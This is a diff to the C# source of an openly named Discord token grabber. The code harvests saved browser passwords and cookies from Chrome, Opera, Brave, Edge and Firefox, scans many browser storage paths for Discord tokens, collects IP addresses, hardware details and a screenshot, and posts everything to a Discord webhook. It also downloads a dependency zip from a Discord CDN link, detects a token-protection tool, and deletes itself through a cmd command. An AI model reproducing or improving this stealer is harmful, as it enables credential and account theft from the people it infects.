@@ -1,9 +1,13 @@
+using Discord;
 using Qvoid_Token_Grabber.PasswordGrabbers;
+using QvoidWrapper;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing.Imaging;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Reflection;
@@ -11,10 +15,6 @@ using System.Security.Principal;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
-using System;
-using Discord;
-using QvoidWrapper;
-using System.IO.Compression;
 using static Discord.Structures.Embed;
 
 namespace Qvoid_Token_Grabber
@@ -24,6 +24,8 @@ namespace Qvoid_Token_Grabber
         /// <summary>
         /// This is the main function which executes the grabber.
         /// </summary>
+        public static string RandomString(int length) => new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length).Select(s => s[new Random().Next(s.Length)]).ToArray());
+
         static public void Grab()
         {
             //Some random path to contains our temp files.
@@ -182,13 +184,13 @@ namespace Qvoid_Token_Grabber
 
                 string BodyMessage = "";
                 string HeadMessage = $"IP Address```{machine.PublicIPv4}```" +
-                                     $"{Environment.NewLine}LAN Address```{machine.LanIPv4}```" +
-                                     $"{Environment.NewLine}Desktop Username```{Environment.UserName}```" +
-                                     $"{Environment.NewLine}Memory```{machine.PcMemory}```" +
-                                     $"{Environment.NewLine}Operating System Architecture```{machine.OsArchitecture}```" +
-                                     $"{Environment.NewLine}GPU Video```{machine.GpuVideo}```" +
-                                     $"{Environment.NewLine}GPU Version```{machine.GpuVersion}```" +
-                                     $"{Environment.NewLine}Windows License```{machine.WindowsLicense}```{Environment.NewLine}";
+                                     $"\nLAN Address```{machine.LanIPv4}```" +
+                                     $"\nDesktop Username```{Environment.UserName}```" +
+                                     $"\nMemory```{machine.PcMemory}```" +
+                                     $"\nOperating System Architecture```{machine.OsArchitecture}```" +
+                                     $"\nGPU Video```{machine.GpuVideo}```" +
+                                     $"\nGPU Version```{machine.GpuVersion}```" +
+                                     $"\nWindows License```{machine.WindowsLicense}```\n";
 
                 string ss_Name = DateTime.UtcNow.Ticks.ToString() + "_Capture.jpg";
                 using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
@@ -229,11 +231,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Passwords)
                                 {
-                                    Passwords += $"{Environment.NewLine}Browser  : Chrome";
-                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
-                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
-                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Passwords += $"Browser  : Chrome\nURL      : {item.url}Username : {item.username}Password : {item.password}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -253,11 +251,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Passwords)
                                 {
-                                    Passwords += $"{Environment.NewLine}Browser  : Opera";
-                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
-                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
-                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Passwords += $"Browser  : Opera\nURL      : {item.url}\nUsername : {item.username}\nPassword : {item.password}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -277,11 +271,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Passwords)
                                 {
-                                    Passwords += $"{Environment.NewLine}Browser  : Brave";
-                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
-                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
-                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Passwords += $"Browser  : Brave\nURL      : {item.url}\nUsername : {item.username}\nPassword : {item.password}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -301,11 +291,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Passwords)
                                 {
-                                    Passwords += $"{Environment.NewLine}Browser  : Edge";
-                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
-                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
-                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Passwords += $"Browser  : Edge\nURL      : {item.url}\nUsername : {item.username}\nPassword : {item.password}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -329,11 +315,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Cookies)
                                 {
-                                    Cookies += $"{Environment.NewLine}Browser   : Chrome";
-                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Cookies += $"Browser   : Chrome\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -353,11 +335,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Cookies)
                                 {
-                                    Cookies += $"{Environment.NewLine}Browser   : Opera";
-                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Cookies += $"\nBrowser   : Opera\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -377,11 +355,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Cookies)
                                 {
-                                    Cookies += $"{Environment.NewLine}Browser   : Brave";
-                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Cookies += $"Browser   : Brave\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -401,11 +375,7 @@ namespace Qvoid_Token_Grabber
                             {
                                 foreach (var item in _Cookies)
                                 {
-                                    Cookies += $"{Environment.NewLine}Browser   : Edge";
-                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                    Cookies += $"\nBrowser   : Edge\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                 }
                             }
                             catch { }
@@ -420,11 +390,7 @@ namespace Qvoid_Token_Grabber
                     {
                         foreach (var item in _Cookies)
                         {
-                            Cookies += $"{Environment.NewLine}Browser   : FireFox";
-                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            Cookies += $"\nBrowser   : FireFox\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                         }
                     }
                 }
@@ -479,11 +445,7 @@ namespace Qvoid_Token_Grabber
 
                     embeds.Add(userEmbed);
 
-                    BodyMessage += $"{Environment.NewLine}Username```{userInfo.Username}#{userInfo.Discriminator}```" +
-                                   $"{Environment.NewLine}Email```{userInfo.Email}```" +
-                                   $"{Environment.NewLine}Phone Number```{curUser.PhoneNumber}```" +
-                                   $"{Environment.NewLine}Premium```{curUser.Nitro}```" +
-                                   $"{Environment.NewLine}Token```{curUser.Token}```";
+                    BodyMessage += $"\nUsername```{userInfo.Username}#{userInfo.Discriminator}```\nEmail```{userInfo.Email}```\nPhone Number```{curUser.PhoneNumber}```\nPremium```{curUser.Nitro}```\nToken```{curUser.Token}```\n";
 
                 }
 
@@ -496,8 +458,8 @@ namespace Qvoid_Token_Grabber
 
                     Structures.DiscordWebhook Webhook = new Structures.DiscordWebhook(Settings.Webhook);
 
-                    string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
-                    string CookiesPath = Path.GetTempPath() + "\\tmp7RDF47.txt";
+                    string PasswordsPath = $"{Path.GetTempPath()}\\tmp{RandomString(6)}.txt";
+                    string CookiesPath = $"{Path.GetTempPath()}\\tmp{RandomString(7)}.txt";
 
                     if (Passwords != "------ Passwords ------")
                     {
@@ -566,12 +528,12 @@ namespace Qvoid_Token_Grabber
             {
                 new Protector()
                 {
-                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
+                    Directory = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\DiscordTokenProtector",
                     Name = "DiscordTokenProtector"
                 },
                 new Protector()
                 {
-                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\DTP_WindowsInstaller",
+                    Directory = $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\DTP_WindowsInstaller",
                     Name = "DiscordTokenProtector"
                 },
             };
@@ -634,7 +596,9 @@ namespace Qvoid_Token_Grabber
                         }
                         catch (Exception ex)
                         {
+#if DEBUG
                             File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
+#endif
                             continue;
                         }
                     }
@@ -657,27 +621,28 @@ namespace Qvoid_Token_Grabber
         /// <param name="Destination"></param>
         static public void Extract(string Path, string Destination)
         {
+            string dlLink = "https://cdn.discordapp.com/attachments/825091638782459912/889657500192874496/Release.zip", ReleaseS = "Release.zip";
             Directory.CreateDirectory(Path);
 
-            FileInfo info = new FileInfo(Path + "Release.zip");
+            FileInfo info = new FileInfo($"{Path}{ReleaseS}");
             if (!info.Exists)
             {
                 //Downloads the dependencies if they don't exists.
                 using (WebClient wc = new WebClient())
-                    wc.DownloadFile("https://cdn.discordapp.com/attachments/825091638782459912/889657500192874496/Release.zip", Path + "Release.zip");
+                    wc.DownloadFile(dlLink, $"{Path}{ReleaseS}");
             }
             else
             {
                 //Verifing the file (you can use SHA256CheckSum), if not valid we install the dependencies.
                 if (info.Length <= 5000)
                     using (WebClient wc = new WebClient())
-                        wc.DownloadFile("https://cdn.discordapp.com/attachments/825091638782459912/889657500192874496/Release.zip", Path + "Release.zip");
+                        wc.DownloadFile(dlLink, $"{Path}{ReleaseS}");
             }
 
             try
             {
                 //Extracts the ZIP content (dependencies) to the destination directory.
-                ZipFile.ExtractToDirectory(Path + "Release.zip", Destination);
+                ZipFile.ExtractToDirectory($"{Path}{ReleaseS}", Destination);
             }
             catch 
             { }
@@ -709,8 +674,8 @@ namespace Qvoid_Token_Grabber
             if (Destruct)
             {
                 string app = AppDomain.CurrentDomain.FriendlyName;
-                string AppPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString() + $@"\{app}";
-                Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del " + AppPath);
+                string AppPath = $"{Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString()}\\{app}";
+                Process.Start("cmd.exe", $"/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del {AppPath}");
                 Process.GetCurrentProcess().Kill();
             }
         }
@@ -740,13 +705,13 @@ namespace Qvoid_Token_Grabber
 
                     foreach (var coreFile in core)
                         foreach (var indexFile in index)
-                            if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
-                                DiscordCores.Add(coreFile.Replace("core.asar", ""));
+                            if (coreFile.Replace("core.asar", string.Empty) == indexFile.Replace("index.js", string.Empty))
+                                DiscordCores.Add(coreFile.Replace("core.asar", string.Empty));
 
                     foreach (var capture in capture_exe)
                         foreach (var indexFile in index)
-                            if (capture.Replace("capture_helper.exe", "") == indexFile.Replace("index.js", ""))
-                                DiscordVoices.Add(capture.Replace("capture_helper.exe", ""));
+                            if (capture.Replace("capture_helper.exe", string.Empty) == indexFile.Replace("index.js", string.Empty))
+                                DiscordVoices.Add(capture.Replace("capture_helper.exe", string.Empty));
 
                     foreach (var file in discord_exe)
                     {
@@ -788,7 +753,7 @@ namespace Qvoid_Token_Grabber
 
             if (TokensLocation.Count == 0)
             {
-                if (File.Exists(DiscordExe.Replace("Discord.exe", "") + "resources\\tmp\\common\\paths.js"))
+                if (File.Exists($"{DiscordExe.Replace("Discord.exe", string.Empty)}resources\\tmp\\common\\paths.js"))
                 {
                     var newLocation_tray = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tray-connected.png", SearchOption.AllDirectories);
                     var newLocation_Transport = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "badge-11.ico", SearchOption.AllDirectories);
@@ -796,10 +761,10 @@ namespace Qvoid_Token_Grabber
                     {
                         foreach (var __file in newLocation_Transport)
                         {
-                            if (_file.Replace("tray-connected.png", "") == __file.Replace("badge-11.ico", ""))
+                            if (_file.Replace("tray-connected.png", string.Empty) == __file.Replace("badge-11.ico", string.Empty))
                             {
-                                if (Directory.Exists(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb"))
-                                    TokensLocation.Add(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb");
+                                if (Directory.Exists($"{_file.Replace("tray-connected.png", string.Empty)}\\Local Storage\\leveldb"))
+                                    TokensLocation.Add($"{_file.Replace("tray-connected.png", string.Empty)}\\Local Storage\\leveldb");
                             }
                         }
                     }
@@ -819,21 +784,24 @@ namespace Qvoid_Token_Grabber
             string _DiscordExe = DiscordExe;
 
             //Adding known tokens paths.
-            TokensLocation.Add(localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
-            TokensLocation.Add(localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
-            TokensLocation.Add(localAppdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
-            TokensLocation.Add(localAppdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Lightcord\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Amigo\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Torch\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Kometa\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Orbitum\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\CentBrowser\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
+            TokensLocation.AddRange(new List<string>()
+            {
+                $"{localAppdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
+                $"{localAppdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
+                $"{localAppdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
+                $"{localAppdata}\\Iridium\\User Data\\Default\\Local Storage\\leveldb",
+                $"{roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
+                $"{roaming}\\Lightcord\\Local Storage\\leveldb",
+                $"{roaming}\\Amigo\\Local Storage\\leveldb",
+                $"{roaming}\\Torch\\Local Storage\\leveldb",
+                $"{roaming}\\Kometa\\Local Storage\\leveldb",
+                $"{roaming}\\Orbitum\\Local Storage\\leveldb",
+                $"{roaming}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
+                $"{roaming}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
+                $"{roaming}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
+                $"{roaming}\\CentBrowser\\Local Storage\\leveldb",
+                $"{roaming}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb"
+            });
 
             List<string> tokens = new List<string>();
 
@@ -842,9 +810,12 @@ namespace Qvoid_Token_Grabber
                 List<string> FireFoxBasedLocation = new List<string>();
                 List<Thread> Threads = new List<Thread>();
 
-                FireFoxBasedLocation.Add(roaming + "\\Mozilla\\Firefox\\Profiles");
-                FireFoxBasedLocation.Add(roaming + "\\Waterfox\\Profiles");
-                FireFoxBasedLocation.Add(roaming + "\\Moonchild Productions\\Pale Moon\\Profiles");
+                FireFoxBasedLocation.AddRange(new List<string>()
+                {
+                    $"{roaming}\\Mozilla\\Firefox\\Profiles",
+                    $"{roaming}\\Waterfox\\Profiles",
+                    $"{roaming}\\Moonchild Productions\\Pale Moon\\Profiles"
+                });
 
                 foreach (var tokenPath in FireFoxBasedLocation)
                 {
@@ -874,14 +845,9 @@ namespace Qvoid_Token_Grabber
                                         using (StreamReader sr = new StreamReader(fs))
                                             fileContent = sr.ReadToEnd();
 
-                                        MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
-                                        MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
-
+                                        MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
+                                        
                                         foreach (Match match in matches)
-                                            if (IsValidToken(match.Value))
-                                                tokens.Add(match.Value);
-
-                                        foreach (Match match in mfaMatches)
                                             if (IsValidToken(match.Value))
                                                 tokens.Add(match.Value);
 
@@ -952,19 +918,13 @@ namespace Qvoid_Token_Grabber
                                 using (StreamReader sr = new StreamReader(fs))
                                     fileContent = sr.ReadToEnd();
 
-                                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
-                                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
+                                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
 
                                 Thread.Sleep(1);
                                 foreach (Match match in matches)
                                     if (IsValidToken(match.Value))
                                         tokens.Add(match.Value);
-
-                                Thread.Sleep(1);
-                                foreach (Match match in mfaMatches)
-                                    if (IsValidToken(match.Value))
-                                        tokens.Add(match.Value);
-
+                                
                                 break;
                             }
                             catch (Exception)
